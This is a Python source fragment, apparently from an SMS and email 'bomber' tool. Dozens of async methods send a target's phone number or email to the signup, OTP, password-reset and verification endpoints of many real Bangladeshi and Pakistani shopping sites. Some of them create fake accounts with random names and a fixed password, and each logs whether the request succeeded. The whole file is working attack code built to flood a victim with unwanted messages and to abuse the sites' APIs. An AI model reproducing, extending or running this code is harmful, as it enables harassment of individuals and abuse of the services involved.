                await self.log_event("EMAIL3 - Busbud Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL3 - Busbud Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email4___mithaibd_register(self):
        api_name = "Email4 - Mithaibd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://mithaibd.com/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL4 - Mithaibd Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL4 - Mithaibd Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email5___saralifestyle_reset(self):
        api_name = "Email5 - Saralifestyle Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://prod.saralifestyle.com/api/Master/SendTokenV1".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"userContactNo":"{phone}","userType":"customer","actionFor":"r"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL5 - Saralifestyle Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL5 - Saralifestyle Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email6___tohfay_register(self):
        api_name = "Email6 - Tohfay Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.tohfay.com/user/register.html".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL6 - Tohfay Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL6 - Tohfay Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email7___tohfay_forgot(self):
        api_name = "Email7 - Tohfay Forgot"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.tohfay.com/forgot-password.html".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL7 - Tohfay Forgot", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL7 - Tohfay Forgot", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email8___mrmedicinemart_signup(self):
        api_name = "Email8 - Mrmedicinemart Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.mrmedicinemart.com/web/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL8 - MrMedicineMart Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL8 - MrMedicineMart Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email9___mrmedicinemart_reset(self):
        api_name = "Email9 - Mrmedicinemart Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.mrmedicinemart.com/web/reset_password".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL9 - MrMedicineMart Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL9 - MrMedicineMart Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email10___robishop_create(self):
        api_name = "Email10 - Robishop Create"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.robishop.com.bd/api/user/create".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"customer":{"email":"{phone}","firstname":"{randomName}","lastname":"{randomName}","custom_attributes":{"mobilenumber":"{randomPhone}"}},"password":"Sojib12345"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL10 - Robishop Create", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL10 - Robishop Create", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email11___robishop_reset(self):
        api_name = "Email11 - Robishop Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.robishop.com.bd/api/user/reset-password".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"email":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL11 - Robishop Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL11 - Robishop Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email12___singerbd_otp(self):
        api_name = "Email12 - Singerbd Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.singerbd.com/api/auth/otp/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"login":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL12 - SingerBD OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL12 - SingerBD OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email13___potakait_register(self):
        api_name = "Email13 - Potakait Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://potakait.com/account/register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL13 - Potakait Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL13 - Potakait Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email14___electronicsbd_register(self):
        api_name = "Email14 - Electronicsbd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.electronics.com.bd/registration".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL14 - ElectronicsBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL14 - ElectronicsBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email15___electronicsbd_recovery(self):
        api_name = "Email15 - Electronicsbd Recovery"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.electronics.com.bd/password-recovery".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL15 - ElectronicsBD Recovery", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL15 - ElectronicsBD Recovery", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email16___globalbrand_register(self):
        api_name = "Email16 - Globalbrand Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.globalbrand.com.bd/index?route=account/register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL16 - GlobalBrand Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL16 - GlobalBrand Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email17___globalbrand_forgot(self):
        api_name = "Email17 - Globalbrand Forgot"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.globalbrand.com.bd/index?route=account/forgotten".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL17 - GlobalBrand Forgot", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL17 - GlobalBrand Forgot", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email18___zymak_register(self):
        api_name = "Email18 - Zymak Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.zymak.com.bd/my-account/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL18 - Zymak Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL18 - Zymak Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email19___zymak_lost_password(self):
        api_name = "Email19 - Zymak Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.zymak.com.bd/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL19 - Zymak Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL19 - Zymak Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email20___shopz_register(self):
        api_name = "Email20 - Shopz Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.shopz.com.bd/my-account/?action=register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL20 - Shopz Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL20 - Shopz Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email21___shopz_lost_password(self):
        api_name = "Email21 - Shopz Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.shopz.com.bd/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL21 - Shopz Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL21 - Shopz Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email22___xclusivebrands_register(self):
        api_name = "Email22 - Xclusivebrands Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://xclusivebrandsbd.com/page-new/admin-ajax.php".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL22 - Xclusivebrands Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL22 - Xclusivebrands Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email23___xclusivebrands_lost_password(self):
        api_name = "Email23 - Xclusivebrands Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://xclusivebrandsbd.com/page-new/admin-ajax.php".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL23 - Xclusivebrands Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL23 - Xclusivebrands Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email24___gamebuybd_register(self):
        api_name = "Email24 - Gamebuybd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://gamebuybd.com/my-account/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL24 - GamebuyBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL24 - GamebuyBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email25___gamebuybd_lost_password(self):
        api_name = "Email25 - Gamebuybd Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://gamebuybd.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL25 - GamebuyBD Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL25 - GamebuyBD Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email26___gameforce_register(self):
        api_name = "Email26 - Gameforce Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://gameforce.pk/my-account/?action=register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL26 - Gameforce Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL26 - Gameforce Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email27___gameforce_lost_password(self):
        api_name = "Email27 - Gameforce Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://gameforce.pk/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL27 - Gameforce Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL27 - Gameforce Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email28___gamecastlebd_register(self):
        api_name = "Email28 - Gamecastlebd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://gamecastlebd.com/my-account/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL28 - GamecastleBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL28 - GamecastleBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email29___gamecastlebd_lost_password(self):
        api_name = "Email29 - Gamecastlebd Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://gamecastlebd.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL29 - GamecastleBD Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL29 - GamecastleBD Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email30___techshopbd_signup(self):
        api_name = "Email30 - Techshopbd Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://techshopbd.com/sign-in".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL30 - TechshopBD Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL30 - TechshopBD Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email31___electronicshopbd_ajax_register(self):
        api_name = "Email31 - Electronicshopbd Ajax Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://electronicshopbd.com/wp-admin/admin-ajax".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL31 - ElectronicShopBD Ajax Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL31 - ElectronicShopBD Ajax Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email32___electronicshopbd_lost_password(self):
        api_name = "Email32 - Electronicshopbd Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://electronicshopbd.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL32 - ElectronicShopBD Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL32 - ElectronicShopBD Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email33___makersbd_register(self):
        api_name = "Email33 - Makersbd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.makersbd.com/customer/store".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL33 - MakersBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL33 - MakersBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email34___abe_register(self):
        api_name = "Email34 - Abe Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://abe.com.bd/customer-register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL34 - ABE Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL34 - ABE Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email35___abe_forget_password(self):
        api_name = "Email35 - Abe Forget Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://abe.com.bd/forgetpassword".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL35 - ABE Forget Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL35 - ABE Forget Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email36___colorcrazebd_signup(self):
        api_name = "Email36 - Colorcrazebd Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.colorcrazebd.com/web/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL36 - ColorCrazeBD Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL36 - ColorCrazeBD Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email37___colorcrazebd_reset(self):
        api_name = "Email37 - Colorcrazebd Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.colorcrazebd.com/web/reset_password".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL37 - ColorCrazeBD Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL37 - ColorCrazeBD Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email38___chowdhuryelectronics_register(self):
        api_name = "Email38 - Chowdhuryelectronics Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.chowdhuryelectronics.com/index.php?route=account/register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL38 - ChowdhuryElectronics Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL38 - ChowdhuryElectronics Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email39___smartview_register(self):
        api_name = "Email39 - Smartview Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://smartview.com.bd/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL39 - Smartview Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL39 - Smartview Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email40___smartview_verify_resend(self):
        api_name = "Email40 - Smartview Verify Resend"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://smartview.com.bd/verify-email/resend?email={target}"
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL40 - Smartview Verify Resend", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL40 - Smartview Verify Resend", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email41___smartview_password_code(self):
        api_name = "Email41 - Smartview Password Code"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://smartview.com.bd/password/code".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL41 - Smartview Password Code", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL41 - Smartview Password Code", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email42___gadstyle_register(self):
        api_name = "Email42 - Gadstyle Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.gadstyle.com/my-account/?action=register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL42 - Gadstyle Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL42 - Gadstyle Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email43___gadstyle_lost_password(self):
        api_name = "Email43 - Gadstyle Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.gadstyle.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL43 - Gadstyle Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL43 - Gadstyle Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email44___havit_register(self):
        api_name = "Email44 - Havit Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://havit.com.bd/my-account/?action=register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL44 - Havit Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL44 - Havit Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email45___havit_lost_password(self):
        api_name = "Email45 - Havit Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://havit.com.bd/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL45 - Havit Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL45 - Havit Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email46___htebd_register(self):
        api_name = "Email46 - Htebd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.htebd.com/my-account/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL46 - HTEBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL46 - HTEBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email47___htebd_lost_password(self):
        api_name = "Email47 - Htebd Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.htebd.com/my-account/lost-password/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL47 - HTEBD Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL47 - HTEBD Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email48___shanbd_register(self):
        api_name = "Email48 - Shanbd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://shanbd.com/index.php?route=account/register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL48 - ShanBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL48 - ShanBD Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api123___shikho_otp_v2(self):
        api_name = "Api123 - Shikho Otp V2"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.shikho.com/v1/auth/send-otp"
        try:
            async with self.session.post(url, json={"phone": target, "type": "login"}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API123 - Shikho OTP V2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API123 - Shikho OTP V2", False, "Error", fmt=current_api_fmt.get())
            return False

